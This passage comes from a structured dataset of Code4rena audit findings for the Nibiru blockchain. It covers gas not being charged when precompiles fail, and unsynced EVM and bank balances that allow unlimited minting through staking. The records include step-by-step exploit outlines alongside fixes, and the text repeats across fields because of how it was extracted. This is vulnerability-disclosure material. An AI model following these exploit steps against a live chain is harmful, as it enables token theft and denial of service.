meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n```\n\n### Impact:\n1. Resource Consumption without Gas Payment: Since gas is not consumed on failure, an attacker can repeatedly trigger precompile failures, consuming large amounts of resources without the associated cost.\n2. Potential DoS Attack: This can lead to a DoS attack, where an attacker fills the block with failed precompile executions, causing network slowdowns, failures, or even halting the chain.\n3. Block Gas Limit Exploitation: Before the precompile.Run method is called, a small amount of requiredGas is consumed. However, once this is consumed, attackers can continue to use gas at no cost, potentially exhausting the block gas limit.\n\n## Proof of Concept\n1. Create an EVM Contract: Design an EVM contract that calls the `wasm.execute` function repeatedly, up to the `maxMultistoreCacheCount` (10) times.\n2. Trigger the DoS: Call the contract with a transaction that uses a large amount of gas limit.\n3. Exploit the Failure: In the `wasm.execute` function, consume almost all of the available gas and then revert the transaction. This will allow the attacker to consume gas without paying for it, leveraging the bug in the precompile failure handling.\n\n## Recommended mitigation steps\n\nUse gas before returning the `err`\n\n```go\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n\nif err != nil {\n    return nil, err\n}\n```\n", "sections": {"description_md": "## Finding description and impact\n\nWhen a precompile method fails (e.g., due to an error), **gas is not consumed** as the method returns early before invoking the gas consumption logic. This issue affects all three precompiles in the system:\n\n- **FunToken**\n- **Wasm**\n- **Oracle**\n\nThe lack of gas consumption on failure allows attackers to perform denial-of-service (DoS) attacks by exploiting the failure conditions to consume excessive resources without paying for them. The code snippet below demonstrates the issue:\n\n```go\nif err != nil {\n    return nil, err\n}\n\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n```\n", "impact_md": "### Impact:\n1. Resource Consumption without Gas Payment: Since gas is not consumed on failure, an attacker can repeatedly trigger precompile failures, consuming large amounts of resources without the associated cost.\n2. Potential DoS Attack: This can lead to a DoS attack, where an attacker fills the block with failed precompile executions, causing network slowdowns, failures, or even halting the chain.\n3. Block Gas Limit Exploitation: Before the precompile.Run method is called, a small amount of requiredGas is consumed. However, once this is consumed, attackers can continue to use gas at no cost, potentially exhausting the block gas limit.\n", "recommendation_md": "## Recommended mitigation steps\n\nUse gas before returning the `err`\n\n```go\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n\nif err != nil {\n    return nil, err\n}\n```\n", "poc_md": "## Proof of Concept\n1. Create an EVM Contract: Design an EVM contract that calls the `wasm.execute` function repeatedly, up to the `maxMultistoreCacheCount` (10) times.\n2. Trigger the DoS: Call the contract with a transaction that uses a large amount of gas limit.\n3. Exploit the Failure: In the `wasm.execute` function, consume almost all of the available gas and then revert the transaction. This will allow the attacker to consume gas without paying for it, leveraging the bug in the precompile failure handling.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/funtoken.go#L79-L84\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L71-L79\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/oracle.go#L60-L64\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/funtoken.go#L79-L84\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L71-L79\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/oracle.go#L60-L64\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nWhen a precompile method fails (e.g., due to an error), **gas is not consumed** as the method returns early before invoking the gas consumption logic. This issue affects all three precompiles in the system:\n\n- **FunToken**\n- **Wasm**\n- **Oracle**\n\nThe lack of gas consumption on failure allows attackers to perform denial-of-service (DoS) attacks by exploiting the failure conditions to consume excessive resources without paying for them. The code snippet below demonstrates the issue:\n\n```go\nif err != nil {\n    return nil, err\n}\n\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n```\n\n### Impact:\n1. Resource Consumption without Gas Payment: Since gas is not consumed on failure, an attacker can repeatedly trigger precompile failures, consuming large amounts of resources without the associated cost.\n2. Potential DoS Attack: This can lead to a DoS attack, where an attacker fills the block with failed precompile executions, causing network slowdowns, failures, or even halting the chain.\n3. Block Gas Limit Exploitation: Before the precompile.Run method is called, a small amount of requiredGas is consumed. However, once this is consumed, attackers can continue to use gas at no cost, potentially exhausting the block gas limit.\n\n## Proof of Concept\n1. Create an EVM Contract: Design an EVM contract that calls the `wasm.execute` function repeatedly, up to the `maxMultistoreCacheCount` (10) times.\n2. Trigger the DoS: Call the contract with a transaction that uses a large amount of gas limit.\n3. Exploit the Failure: In the `wasm.execute` function, consume almost all of the available gas and then revert the transaction. This will allow the attacker to consume gas without paying for it, leveraging the bug in the precompile failure handling.\n\n## Recommended mitigation steps\n\nUse gas before returning the `err`\n\n```go\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n\nif err != nil {\n    return nil, err\n}\n```\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/funtoken.go#L79-L84\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L71-L79\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/oracle.go#L60-L64\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nWhen a precompile method fails (e.g., due to an error), **gas is not consumed** as the method returns early before invoking the gas consumption logic. This issue affects all three precompiles in the system:\n\n- **FunToken**\n- **Wasm**\n- **Oracle**\n\nThe lack of gas consumption on failure allows attackers to perform denial-of-service (DoS) attacks by exploiting the failure conditions to consume excessive resources without paying for them. The code snippet below demonstrates the issue:\n\n```go\nif err != nil {\n    return nil, err\n}\n\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n```\n\n### Impact:\n1. Resource Consumption without Gas Payment: Since gas is not consumed on failure, an attacker can repeatedly trigger precompile failures, consuming large amounts of resources without the associated cost.\n2. Potential DoS Attack: This can lead to a DoS attack, where an attacker fills the block with failed precompile executions, causing network slowdowns, failures, or even halting the chain.\n3. Block Gas Limit Exploitation: Before the precompile.Run method is called, a small amount of requiredGas is consumed. However, once this is consumed, attackers can continue to use gas at no cost, potentially exhausting the block gas limit.\n\n## Proof of Concept\n1. Create an EVM Contract: Design an EVM contract that calls the `wasm.execute` function repeatedly, up to the `maxMultistoreCacheCount` (10) times.\n2. Trigger the DoS: Call the contract with a transaction that uses a large amount of gas limit.\n3. Exploit the Failure: In the `wasm.execute` function, consume almost all of the available gas and then revert the transaction. This will allow the attacker to consume gas without paying for it, leveraging the bug in the precompile failure handling.\n\n## Recommended mitigation steps\n\nUse gas before returning the `err`\n\n```go\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n\nif err != nil {\n    return nil, err\n}\n```\n"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-026", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 26, "page_start": null, "title": "Unlimited Nibi could be minted because evm and bank balance are not synced when staking", "short_summary": null, "description_md": "## Finding description and impact\n\n`NibiruBankKeeper.SyncStateDBWithAccount` function in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80C1-L91C2) is responsible for synchronizing the EVM state database (`StateDB`) with the corresponding bank account balance whenever the balance is updated. However, this function is not invoked by all operations that modify bank balances.\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n\tctx sdk.Context, acc sdk.AccAddress,\n) {\n\t// If there's no StateDB set, it means we're not in an EthereumTx.\n\tif bk.StateDB == nil {\n\t\treturn\n\t}\n\tbalanceWei := evm.NativeToWei(\n\t\tbk.GetBalance(ctx, acc, evm.EVMBankDenom).Amount.BigInt(),\n\t)\n\tbk.StateDB.SetBalanceWei(eth.NibiruAddrToEthAddr(acc), balanceWei)\n}\n```\n\nThe following functions call [bankKeeper.setBalance](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/bank/keeper/send.go#L337), but some do not trigger SyncStateDBWithAccount:\n\n* bankKeeper.addCoins\n    * bankKeeper.SendCoins ( Synced)\n        * bankMsgServer.Send\n        * bankKeeper.SendCoinsFromModuleToAccount ( Synced)\n        * bankKeeper.SendCoinsFromModuleToModule ( Synced)\n        * bankKeeper.SendCoinsFromAccountToModule ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n        * bankMsgServer.MultiSend\n    * bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.MintCoins ( Synced)\n* bankKeeper.subUnlockedCoins\n    * bankKeeper.SendCoins ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.BurnCoins ( Synced)\n* bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.DelegateCoinsFromAccountToModule\n        * stakingKeeper.Delegate\n            * stakingMsgServer.CreateValidator\n            * stakingMsgServer.Delegate\n            * stakingMsgServer.CancelUnbondingDelegation\n            * stakingKeeper.BeginRedelegation\n                * stakingMsgServer.BeginRedelegate\n\nThe EVM can mint or burn an arbitrary amount of Nibi tokens when the `obj.Account.BalanceWei` in the StateDB is out of sync. Specifically, the EVM's [SetAccBalance](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L98) function allows this discrepancy to occur if balances are updated outside of the SyncStateDBWithAccount mechanism.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80-L91\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L103\n\n\n# Vulnerability details\n\n## Finding description and impact\n\n`NibiruBankKeeper.SyncStateDBWithAccount` function in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80C1-L91C2) is responsible for synchronizing the EVM state database (`StateDB`) with the corresponding bank account balance whenever the balance is updated. However, this function is not invoked by all operations that modify bank balances.\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n\tctx sdk.Context, acc sdk.AccAddress,\n) {\n\t// If there's no StateDB set, it means we're not in an EthereumTx.\n\tif bk.StateDB == nil {\n\t\treturn\n\t}\n\tbalanceWei := evm.NativeToWei(\n\t\tbk.GetBalance(ctx, acc, evm.EVMBankDenom).Amount.BigInt(),\n\t)\n\tbk.StateDB.SetBalanceWei(eth.NibiruAddrToEthAddr(acc), balanceWei)\n}\n```\n\nThe following functions call [bankKeeper.setBalance](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/bank/keeper/send.go#L337), but some do not trigger SyncStateDBWithAccount:\n\n* bankKeeper.addCoins\n    * bankKeeper.SendCoins ( Synced)\n        * bankMsgServer.Send\n        * bankKeeper.SendCoinsFromModuleToAccount ( Synced)\n        * bankKeeper.SendCoinsFromModuleToModule ( Synced)\n        * bankKeeper.SendCoinsFromAccountToModule ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n        * bankMsgServer.MultiSend\n    * bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.MintCoins ( Synced)\n* bankKeeper.subUnlockedCoins\n    * bankKeeper.SendCoins ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.BurnCoins ( Synced)\n* bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.DelegateCoinsFromAccountToModule\n        * stakingKeeper.Delegate\n            * stakingMsgServer.CreateValidator\n            * stakingMsgServer.Delegate\n            * stakingMsgServer.CancelUnbondingDelegation\n            * stakingKeeper.BeginRedelegation\n                * stakingMsgServer.BeginRedelegate\n\nThe EVM can mint or burn an arbitrary amount of Nibi tokens when the `obj.Account.BalanceWei` in the StateDB is out of sync. Specifically, the EVM's [SetAccBalance](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L98) function allows this discrepancy to occur if balances are updated outside of the SyncStateDBWithAccount mechanism.\n\n\n## Proof of Concept\nThe `bankKeeper.DelegateCoins` function illustrates this vulnerability. It would reduce the balance of delegator address and increase the balance [BondedPoolName or NotBondedPoolName](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/staking/keeper/delegation.go#L672-L680) module address. And this could be triggered because\n* stakingMsgServer can reach it with Delegate -> stakingKeeper.Delegate -> bankKeeper.DelegateCoinsFromAccountToModule -> bankKeeper.DelegateCoins\n* stakingMsgServer can be triggered by wasm contracts ([reference1](https://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465)    |    [reference2](https://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9))\n* wasm contracts can be triggered by evm contracts ([ref](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2))\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465\n```go\nsupportedFeatures := strings.Join(wasmdapp.AllCapabilities(), \",\")\n\n// Create wasm VM outside keeper so it can be re-used in client keeper\nwasmVM, err := wasmvm.NewVM(filepath.Join(wasmDir, \"wasm\"), supportedFeatures, wasmVmContractMemoryLimit, wasmConfig.ContractDebugMode, wasmConfig.MemoryCacheSize)\n```\n\nhttps://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9\n```go\nfunc AllCapabilities() []string {\n\treturn []string{\n\t\t\"iterator\",\n\t\t\"staking\",\n\t\t\"stargate\",\n\t\t\"cosmwasm_1_1\",\n\t\t\"cosmwasm_1_2\",\n\t\t\"cosmwasm_1_3\",\n\t\t\"cosmwasm_1_4\",\n\t}\n}\n```\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2\n```go\n// execute invokes a Wasm contract's \"ExecuteMsg\", which corresponds to\n// \"wasm/types/MsgExecuteContract\". This enables arbitrary smart contract\n// execution using the Wasm VM from the EVM.\n//\n// Implements \"execute\" from evm/embeds/contracts/Wasm.sol:\n//\n//\t```solidity\n//\t function execute(\n//\t   string memory contractAddr,\n//\t   bytes memory msgArgs,\n//\t   BankCoin[] memory funds\n//\t ) payable external returns (bytes memory response);\n//\t```\n//\n// Contract Args:\n//   - contractAddr: nibi-prefixed Bech32 address of the wasm contract\n//   - msgArgs: JSON encoded wasm execute invocation\n//   - funds: Optional funds to supply during the execute call. It's\n//     uncommon to use this field, so you'll pass an empty array most of the time.\nfunc (p precompileWasm) execute(\n\tstart OnRunStartResult,\n\tcaller gethcommon.Address,\n\treadOnly bool,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertNotReadonlyTx(readOnly, method); err != nil {\n\t\treturn nil, err\n\t}\n\n\twasmContract, msgArgsBz, funds, err := p.parseArgsWasmExecute(args)\n\tif err != nil {\n\t\terr = ErrInvalidArgs(err)\n\t\treturn\n\t}\n\tdata, err := p.Wasm.Execute(ctx, wasmContract, eth.EthAddrToNibiruAddr(caller), msgArgsBz, funds)\n\tif err != nil {\n\t\treturn\n\t}\n\treturn method.Outputs.Pack(data)\n}\n```\n\n### Exploit Steps\n* Create a Wasm contract to perform staking-related operations and fund it with `X` Nibi.\n* Create an EVM contract to interact with the Wasm contract.\n* In the EVM contract:\n    * Transfer dust amount to the wasm so that the account is retrieved and added to the statedb's stateObjects\n    * Instruct the wasm contract to delegate `Y` Nibi\n* When delegate reduces the wasm balance from `X` to `X-Y`. EVM would still believe the balance is `X` and `SetAccBalance` would increase the balance from `X-Y` to `X` by minting `Y`.\n* The attacker can call the wasm contract to undelegate the delegated `Y` Nibi... Or attack several times to take over the chain.\n\n\n## Recommended mitigation steps\nMake sure EVM statedb is synced for every action that changes bank balances, preferably from `setBalance`.\n", "sections": {"description_md": "## Finding description and impact\n\n`NibiruBankKeeper.SyncStateDBWithAccount` function in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80C1-L91C2) is responsible for synchronizing the EVM state database (`StateDB`) with the corresponding bank account balance whenever the balance is updated. However, this function is not invoked by all operations that modify bank balances.\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n\tctx sdk.Context, acc sdk.AccAddress,\n) {\n\t// If there's no StateDB set, it means we're not in an EthereumTx.\n\tif bk.StateDB == nil {\n\t\treturn\n\t}\n\tbalanceWei := evm.NativeToWei(\n\t\tbk.GetBalance(ctx, acc, evm.EVMBankDenom).Amount.BigInt(),\n\t)\n\tbk.StateDB.SetBalanceWei(eth.NibiruAddrToEthAddr(acc), balanceWei)\n}\n```\n\nThe following functions call [bankKeeper.setBalance](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/bank/keeper/send.go#L337), but some do not trigger SyncStateDBWithAccount:\n\n* bankKeeper.addCoins\n    * bankKeeper.SendCoins ( Synced)\n        * bankMsgServer.Send\n        * bankKeeper.SendCoinsFromModuleToAccount ( Synced)\n        * bankKeeper.SendCoinsFromModuleToModule ( Synced)\n        * bankKeeper.SendCoinsFromAccountToModule ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n        * bankMsgServer.MultiSend\n    * bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.MintCoins ( Synced)\n* bankKeeper.subUnlockedCoins\n    * bankKeeper.SendCoins ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.BurnCoins ( Synced)\n* bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.DelegateCoinsFromAccountToModule\n        * stakingKeeper.Delegate\n            * stakingMsgServer.CreateValidator\n            * stakingMsgServer.Delegate\n            * stakingMsgServer.CancelUnbondingDelegation\n            * stakingKeeper.BeginRedelegation\n                * stakingMsgServer.BeginRedelegate\n\nThe EVM can mint or burn an arbitrary amount of Nibi tokens when the `obj.Account.BalanceWei` in the StateDB is out of sync. Specifically, the EVM's [SetAccBalance](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L98) function allows this discrepancy to occur if balances are updated outside of the SyncStateDBWithAccount mechanism.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\nMake sure EVM statedb is synced for every action that changes bank balances, preferably from `setBalance`.\n", "poc_md": "## Proof of Concept\nThe `bankKeeper.DelegateCoins` function illustrates this vulnerability. It would reduce the balance of delegator address and increase the balance [BondedPoolName or NotBondedPoolName](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/staking/keeper/delegation.go#L672-L680) module address. And this could be triggered because\n* stakingMsgServer can reach it with Delegate -> stakingKeeper.Delegate -> bankKeeper.DelegateCoinsFromAccountToModule -> bankKeeper.DelegateCoins\n* stakingMsgServer can be triggered by wasm contracts ([reference1](https://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465)    |    [reference2](https://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9))\n* wasm contracts can be triggered by evm contracts ([ref](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2))\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465\n```go\nsupportedFeatures := strings.Join(wasmdapp.AllCapabilities(), \",\")\n\n// Create wasm VM outside keeper so it can be re-used in client keeper\nwasmVM, err := wasmvm.NewVM(filepath.Join(wasmDir, \"wasm\"), supportedFeatures, wasmVmContractMemoryLimit, wasmConfig.ContractDebugMode, wasmConfig.MemoryCacheSize)\n```\n\nhttps://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9\n```go\nfunc AllCapabilities() []string {\n\treturn []string{\n\t\t\"iterator\",\n\t\t\"staking\",\n\t\t\"stargate\",\n\t\t\"cosmwasm_1_1\",\n\t\t\"cosmwasm_1_2\",\n\t\t\"cosmwasm_1_3\",\n\t\t\"cosmwasm_1_4\",\n\t}\n}\n```\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2\n```go\n// execute invokes a Wasm contract's \"ExecuteMsg\", which corresponds to\n// \"wasm/types/MsgExecuteContract\". This enables arbitrary smart contract\n// execution using the Wasm VM from the EVM.\n//\n// Implements \"execute\" from evm/embeds/contracts/Wasm.sol:\n//\n//\t```solidity\n//\t function execute(\n//\t   string memory contractAddr,\n//\t   bytes memory msgArgs,\n//\t   BankCoin[] memory funds\n//\t ) payable external returns (bytes memory response);\n//\t```\n//\n// Contract Args:\n//   - contractAddr: nibi-prefixed Bech32 address of the wasm contract\n//   - msgArgs: JSON encoded wasm execute invocation\n//   - funds: Optional funds to supply during the execute call. It's\n//     uncommon to use this field, so you'll pass an empty array most of the time.\nfunc (p precompileWasm) execute(\n\tstart OnRunStartResult,\n\tcaller gethcommon.Address,\n\treadOnly bool,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertNotReadonlyTx(readOnly, method); err != nil {\n\t\treturn nil, err\n\t}\n\n\twasmContract, msgArgsBz, funds, err := p.parseArgsWasmExecute(args)\n\tif err != nil {\n\t\terr = ErrInvalidArgs(err)\n\t\treturn\n\t}\n\tdata, err := p.Wasm.Execute(ctx, wasmContract, eth.EthAddrToNibiruAddr(caller), msgArgsBz, funds)\n\tif err != nil {\n\t\treturn\n\t}\n\treturn method.Outputs.Pack(data)\n}\n```\n\n### Exploit Steps\n* Create a Wasm contract to perform staking-related operations and fund it with `X` Nibi.\n* Create an EVM contract to interact with the Wasm contract.\n* In the EVM contract:\n    * Transfer dust amount to the wasm so that the account is retrieved and added to the statedb's stateObjects\n    * Instruct the wasm contract to delegate `Y` Nibi\n* When delegate reduces the wasm balance from `X` to `X-Y`. EVM would still believe the balance is `X` and `SetAccBalance` would increase the balance from `X-Y` to `X` by minting `Y`.\n* The attacker can call the wasm contract to undelegate the delegated `Y` Nibi... Or attack several times to take over the chain.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80-L91\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L103\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80-L91\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L103\n\n\n# Vulnerability details\n\n## Finding description and impact\n\n`NibiruBankKeeper.SyncStateDBWithAccount` function in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80C1-L91C2) is responsible for synchronizing the EVM state database (`StateDB`) with the corresponding bank account balance whenever the balance is updated. However, this function is not invoked by all operations that modify bank balances.\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n\tctx sdk.Context, acc sdk.AccAddress,\n) {\n\t// If there's no StateDB set, it means we're not in an EthereumTx.\n\tif bk.StateDB == nil {\n\t\treturn\n\t}\n\tbalanceWei := evm.NativeToWei(\n\t\tbk.GetBalance(ctx, acc, evm.EVMBankDenom).Amount.BigInt(),\n\t)\n\tbk.StateDB.SetBalanceWei(eth.NibiruAddrToEthAddr(acc), balanceWei)\n}\n```\n\nThe following functions call [bankKeeper.setBalance](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/bank/keeper/send.go#L337), but some do not trigger SyncStateDBWithAccount:\n\n* bankKeeper.addCoins\n    * bankKeeper.SendCoins ( Synced)\n        * bankMsgServer.Send\n        * bankKeeper.SendCoinsFromModuleToAccount ( Synced)\n        * bankKeeper.SendCoinsFromModuleToModule ( Synced)\n        * bankKeeper.SendCoinsFromAccountToModule ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n        * bankMsgServer.MultiSend\n    * bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.MintCoins ( Synced)\n* bankKeeper.subUnlockedCoins\n    * bankKeeper.SendCoins ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.BurnCoins ( Synced)\n* bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.DelegateCoinsFromAccountToModule\n        * stakingKeeper.Delegate\n            * stakingMsgServer.CreateValidator\n            * stakingMsgServer.Delegate\n            * stakingMsgServer.CancelUnbondingDelegation\n            * stakingKeeper.BeginRedelegation\n                * stakingMsgServer.BeginRedelegate\n\nThe EVM can mint or burn an arbitrary amount of Nibi tokens when the `obj.Account.BalanceWei` in the StateDB is out of sync. Specifically, the EVM's [SetAccBalance](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L98) function allows this discrepancy to occur if balances are updated outside of the SyncStateDBWithAccount mechanism.\n\n\n## Proof of Concept\nThe `bankKeeper.DelegateCoins` function illustrates this vulnerability. It would reduce the balance of delegator address and increase the balance [BondedPoolName or NotBondedPoolName](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/staking/keeper/delegation.go#L672-L680) module address. And this could be triggered because\n* stakingMsgServer can reach it with Delegate -> stakingKeeper.Delegate -> bankKeeper.DelegateCoinsFromAccountToModule -> bankKeeper.DelegateCoins\n* stakingMsgServer can be triggered by wasm contracts ([reference1](https://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465)    |    [reference2](https://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9))\n* wasm contracts can be triggered by evm contracts ([ref](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2))\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465\n```go\nsupportedFeatures := strings.Join(wasmdapp.AllCapabilities(), \",\")\n\n// Create wasm VM outside keeper so it can be re-used in client keeper\nwasmVM, err := wasmvm.NewVM(filepath.Join(wasmDir, \"wasm\"), supportedFeatures, wasmVmContractMemoryLimit, wasmConfig.ContractDebugMode, wasmConfig.MemoryCacheSize)\n```\n\nhttps://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9\n```go\nfunc AllCapabilities() []string {\n\treturn []string{\n\t\t\"iterator\",\n\t\t\"staking\",\n\t\t\"stargate\",\n\t\t\"cosmwasm_1_1\",\n\t\t\"cosmwasm_1_2\",\n\t\t\"cosmwasm_1_3\",\n\t\t\"cosmwasm_1_4\",\n\t}\n}\n```\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2\n```go\n// execute invokes a Wasm contract's \"ExecuteMsg\", which corresponds to\n// \"wasm/types/MsgExecuteContract\". This enables arbitrary smart contract\n// execution using the Wasm VM from the EVM.\n//\n// Implements \"execute\" from evm/embeds/contracts/Wasm.sol:\n//\n//\t```solidity\n//\t function execute(\n//\t   string memory contractAddr,\n//\t   bytes memory msgArgs,\n//\t   BankCoin[] memory funds\n//\t ) payable external returns (bytes memory response);\n//\t```\n//\n// Contract Args:\n//   - contractAddr: nibi-prefixed Bech32 address of the wasm contract\n//   - msgArgs: JSON encoded wasm execute invocation\n//   - funds: Optional funds to supply during the execute call. It's\n//     uncommon to use this field, so you'll pass an empty array most of the time.\nfunc (p precompileWasm) execute(\n\tstart OnRunStartResult,\n\tcaller gethcommon.Address,\n\treadOnly bool,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, 